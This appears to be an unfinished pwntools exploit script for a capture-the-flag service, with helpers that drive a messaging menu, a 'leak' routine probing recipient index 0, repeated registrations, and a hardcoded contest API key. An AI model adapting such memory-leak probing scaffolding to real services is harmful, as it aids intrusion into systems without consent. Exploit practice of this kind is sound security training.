from pwn import *
import json
HOST = "disposable.eatpwnnosleep.com"
PORT = 30020
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
  a = {
      'apikey' : "a7d4eeae97f394fc427ebfac74e8158c9aa578136716cc72e081edce445ba3e2",
      }

  s.send(json.dumps(a).encode())
else:
  s = remote('192.168.33.10',PORT)
def reg(name,pw):
  s.recvuntil('>')
  s.sendline('2')
  s.recvuntil('username:')
  s.sendline(name)
  s.recvuntil('password:')
  s.sendline(pw)
def login(name,pw):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil('username:')
  s.sendline(name)
  s.recvuntil('password:')
  s.sendline(pw)
def send_msg(to, msg):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil('whom?')
  s.sendline(to)
  s.recvuntil('message:')
  s.sendline(msg)
def leak(): 
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil('whom?')
  s.sendline("0")
def view():
  s.recvuntil('>')
  s.sendline('2')
def out():
  s.recvuntil('>')
  s.sendline('4')
def delete():
  s.recvuntil('>')
  s.sendline('5')
reg("A"*4,"A"*4)
reg("A"*4,"A"*4)
reg("A"*4,"A"*4)
reg("A"*4,"A"*4)
reg("A"*4,"A"*4)
#login("A"*4,"A"*4)

s.interactive()
